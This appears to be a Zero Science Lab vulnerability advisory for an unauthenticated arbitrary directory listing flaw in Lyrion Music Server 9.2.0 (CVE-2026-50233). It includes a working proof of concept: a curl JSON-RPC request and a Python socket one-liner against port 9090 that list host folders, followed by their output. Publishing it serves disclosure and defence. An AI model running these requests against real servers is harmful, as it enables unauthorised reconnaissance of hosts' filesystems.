@@ -1,0 +1,68 @@
+
+Lyrion Music Server 9.2.0 Arbitrary Directory Listing
+
+
+Vendor: LMS Community
+Product web page: https://www.lyrion.org
+Affected version 9.2.0
+
+Summary: Lyrion Music Server (formerly Logitech Media Server, and
+often abbreviated as "LMS" ) is open-source software which can control
+and serve (stream) music to a wide range of physical and virtual audio
+players called Squeezeboxes. Lyrion Music Server can stream your local
+music collection, internet radio stations, and content from many streaming
+services (with and without subscriptions). The Command Line Interface
+plugin allows Squeezebox software and the players to be controlled remotely
+over a TCP/IP connection, for example by a third party automation system
+like AMX or Crestron.
+
+Desc: Lyrion Music Server exposes a readdirectory query through both its
+CLI service (TCP port 9090) and its HTTP JSON-RPC endpoint (/jsonrpc.js)
+that takes a folder parameter and lists its contents with no restriction
+to the configured media directories and no authentication in the default
+configuration. A remote attacker on the network can enumerate arbitrary
+locations on the host filesystem.
+
+Tested on: Windows 10 (64-bit) - EN
+           Lyrion Music Server (9.2.0 - 1779973211)
+           Perl/5.32.1
+           SQLite
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5991
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5991
+CVE ID: CVE-2026-50233
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2026-50233
+
+
+27.05.2026
+
+--
+
+
+$ curl http://localhost:9000/jsonrpc.js \
+> -d "{\"id\":1,\"method\":\"slim.request\",\"params\":[\"\",[\"readdirectory\",\"0\",\"100\",\"folder:C:\\users\"]]}"
+
+{"result":{"fsitems_loop":[{"path":"C:\\users\\.NET v4.5","isfolder":"1","name":".NET v4.5"},{"name":".NET v4.5 Classic","isfolder":"1","path":"C:\\users\\.NET v4.5 Classic"},{"name":"DefaultAppPool","isfolder":"1","path":"C:\\users\\DefaultAppPool"},{"isfolder":"1","name":"defaultuser0","path":"C:\\users\\defaultuser0"},{"path":"C:\\users\\testuser","isfolder":"1","name":"testuser"},{"isfolder":"1","name":"Public","path":"C:\\users\\Public"}],"count":6},"id":1,"method":"slim.request","params":["",["readdirectory","0","100","folder:C:\\users"]]}
+
+
+$ python -c "import socket,urllib.parse,pprint; s=socket.socket(); s.connect(('127.0.0.1',9090)); s.sendall(b'readdirectory 0 100 folder:C:\r\\n'); raw=s.recv(65535).decode(); s.close(); txt=urllib.parse.unquote(raw); parts=txt.split(); items=[]; cur={}; [ (items.append(cur) or (cur:={})) if k=='path' and cur else cur.update({k:v}) for k,v in (p.split(':',1) for p in parts if ':' in p) ]; items.append(cur); pprint.pprint(items)"
+[{'count': '14', 'folder': 'C:'},
+ {'isfolder': '1', 'name': 'BIOS'},
+ {'isfolder': '1', 'name': 'drivers'},
+ {'isfolder': '1', 'name': 'Intel'},
+ {'isfolder': '1', 'name': 'jython2.7.0'},
+ {'isfolder': '1', 'name': 'OpenSSL-Win32'},
+ {'isfolder': '1', 'name': 'PaintToolSAI'},
+ {'isfolder': '1', 'name': 'Program'},
+ {'isfolder': '1', 'name': 'Program'},
+ {'isfolder': '1', 'name': 'Temp'},
+ {'isfolder': '1', 'name': 'Users'},
+ {'isfolder': '1', 'name': 'Windows'},
+ {'isfolder': '1', 'name': 'xampp'},
+ {'isfolder': '', 'name': 'test.txt'},
+ {'isfolder': '', 'name': 'NTUSER.dat'}]
